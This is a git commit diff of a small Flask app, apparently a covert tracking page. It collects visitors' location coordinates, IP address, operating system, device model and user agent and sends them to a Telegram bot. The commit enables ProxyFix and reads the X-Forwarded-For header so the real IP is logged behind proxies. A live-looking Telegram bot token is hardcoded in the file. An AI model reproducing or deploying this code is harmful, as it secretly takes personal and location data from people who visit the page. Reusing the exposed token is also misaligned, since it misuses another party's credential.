32f2abcde85123751ea4fed29490e06e8a43f92f
pagengone <136165501+pagengone@users.noreply.github.com>
2024-05-10 08:00:25 +0300

    Update hello.py

--- hello.py
+++ hello.py
@@ -1,9 +1,9 @@
 from flask import Flask, render_template, request
 import requests
-#from werkzeug.middleware.proxy_fix import ProxyFix
+from werkzeug.middleware.proxy_fix import ProxyFix
 
 app = Flask(__name__)
-#app.wsgi_app = ProxyFix(app.wsgi_app)  # Integrate ProxyFix middleware
+app.wsgi_app = ProxyFix(app.wsgi_app)  # Integrate ProxyFix middleware
 
 # Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
 TELEGRAM_BOT_TOKEN = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
@@ -25,7 +25,7 @@ def index():
     #
     
     #ip_address = request.remote_addr
-    ip_address = request.remote_addr
+   # ip_address = request.remote_addr
     proxyy = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
     user_agent = request.user_agent.string
     os = request.user_agent.platform
@@ -37,11 +37,11 @@ def index():
     # Sending coordinates to Telegram
     if coords:
      ##   send_telegram_message(f"Location coordinates: {coords}")
-          send_telegram_message(f"الاحداثيات:\n https://www.google.com/maps/place/{coords} \n\n{ip_address}")
+          send_telegram_message(f"الاحداثيات:\n https://www.google.com/maps/place/{coords} \n\n{proxyy}")
 
     # Storing and sending user information to Telegram
     #\nUser Agent: {user_agent}
-    message = f"IP: {ip_address}\nProxy: {proxyy}\nOS: {os}\nModdel: {device_model}\n\nUSER AGENT: \n{user_agent}"
+    message = f"IP: {proxyy}\nOS: {os}\nModdel: {device_model}\n\nUSER AGENT: \n{user_agent}"
     send_telegram_message(message)
     #
     return render_template('index.html')
